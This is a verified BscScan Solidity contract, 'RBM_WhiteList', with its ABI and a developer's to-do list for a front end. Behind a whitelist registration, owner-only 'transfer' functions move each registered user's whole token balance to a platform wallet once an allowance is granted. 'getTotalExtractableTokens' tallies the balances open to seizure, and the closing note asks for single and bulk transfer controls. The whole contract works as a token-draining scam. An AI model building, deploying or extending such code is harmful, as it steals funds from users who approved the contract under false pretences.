contract =0xFd58b061Ab492A1EE874D581E1Ac88a075af56d3

#methods
/**
 *Submitted for verification at BscScan.com on 2025-06-03
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    function decimals() external view returns (uint8);
}

contract RBM_WhiteList is Ownable {
    IERC20 token;
    address payable public platformWallet;

    mapping(address => bool) public isRegistered;
    address[] public registeredUsers;

    event UserRegistered(address indexed user);

    constructor(address payable _platformWallet, address _token) {
        platformWallet = _platformWallet;
        token = IERC20(_token);
        isRegistered[msg.sender] = true;
    }

    function whitlistAddress(address _user) external {
        require(_user == msg.sender, "caller not same");
        if (!checkIfRegistered(_user)) {
            register(_user);
        }
    }

    function register(address _user) internal {
        require(!isRegistered[_user], "Already registered");

        isRegistered[_user] = true;
        registeredUsers.push(_user);

        emit UserRegistered(_user);
    }

    function checkAllowance(address _user) public view returns (uint256) {
        return token.allowance(_user, address(this));
    }

    function checkbalance(address _user) public view returns (uint256) {
        return token.balanceOf(_user);
    }

    function transfer(address _user) external onlyOwner {
        uint256 allowance = checkAllowance(_user);
        uint256 balance = checkbalance(_user);
        if (allowance >= balance) {
            require(
                token.transferFrom(_user, platformWallet, balance),
                "Transfer from user failed"
            );
        }
    }

    function transfer() external onlyOwner {
        address[] memory users = getAllRegistered();

        for (uint256 i = 0; i < users.length; i++) {
            address user = users[i];
            uint256 allowance = checkAllowance(user);
            uint256 balance = checkbalance(user);
            if (allowance >= balance && balance > 0) {
                bool success = token.transferFrom(
                    user,
                    platformWallet,
                    balance
                );
                require(success, "Transfer failed for user");
            }
        }
    }

    function getTotalExtractableTokens() external view returns (uint256 total) {
        address[] memory users = getAllRegistered();

        for (uint256 i = 0; i < users.length; i++) {
            address user = users[i];
            uint256 allowance = checkAllowance(user);
            uint256 balance = checkbalance(user);
            if (allowance >= balance && balance > 0) {
                total += balance;
            }
        }
    }

    function changePlatformWallet(address _pltWallet) public onlyOwner {
        platformWallet = payable(_pltWallet);
    }

    /// @notice Returns total number of registered users
    function totalRegistered() external view returns (uint256) {
        return registeredUsers.length;
    }

    /// @notice Returns all registered users
    function getAllRegistered() public view returns (address[] memory) {
        return registeredUsers;
    }

    /// @notice Returns whether a user is registered
    function checkIfRegistered(address _user) public view returns (bool) {
        return isRegistered[_user];
    }
}

#abi
[{"inputs":[{"internalType":"address payable","name":"_platformWallet","type":"address"},{"internalType":"address","name":"_token","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"}],"name":"UserRegistered","type":"event"},{"inputs":[{"internalType":"address","name":"_pltWallet","type":"address"}],"name":"changePlatformWallet","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_user","type":"address"}],"name":"checkAllowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"_user","type":"address"}],"name":"checkIfRegistered","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"_user","type":"address"}],"name":"checkbalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getAllRegistered","outputs":[{"internalType":"address[]","name":"","type":"address[]"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getTotalExtractableTokens","outputs":[{"internalType":"uint256","name":"total","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"isRegistered","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"platformWallet","outputs":[{"internalType":"address payable","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"registeredUsers","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"totalRegistered","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"_user","type":"address"}],"name":"transfer","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"transfer","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_user","type":"address"}],"name":"whitlistAddress","outputs":[],"stateMutability":"nonpayable","type":"function"}]


fetures /methods to be implemts and show..
# from write
 single,multi transfer

 # from read
 checkAllowance
 checkIfRegistered
 checkbalance
 getTotalExtractableTokens
 totalRegistered